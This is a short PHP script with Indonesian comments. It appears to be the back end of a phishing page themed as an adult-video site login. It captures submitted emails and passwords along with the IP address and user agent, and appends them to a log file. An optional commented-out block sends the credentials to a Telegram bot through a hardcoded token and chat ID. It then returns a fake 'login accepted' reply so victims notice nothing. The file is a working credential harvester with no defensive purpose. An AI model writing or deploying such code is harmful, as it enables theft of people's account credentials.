<?php
// Ambil data dari form
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Format data yang akan disimpan
$data = "==========\n";
$data .= "WAKTU : " . date('Y-m-d H:i:s') . "\n";
$data .= "IP    : $ip\n";
$data .= "UA    : $userAgent\n";
$data .= "EMAIL : $email\n";
$data .= "PASS  : $password\n";
$data .= "==========\n\n";

// Simpan ke file log.txt (otomatis kebuat)
file_put_contents("log.txt", $data, FILE_APPEND);

// 🔥 OPSIONAL: Kirim ke Telegram (isi token dan chat_id lo)
/*
$token = "8627394983:AAFPZR6Elkjf70Ck331gCFZhDjp2Cr_itVk";
$chat_id = "8246027862";
$message = urlencode("📧 VIDEY 18+ LOGIN\nIP: $ip\nEmail: $email\nPassword: $password");
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message");
*/

// Balikin response ke frontend biar gak error
echo json_encode(["status" => "ok", "message" => "Login diterima"]);
?>
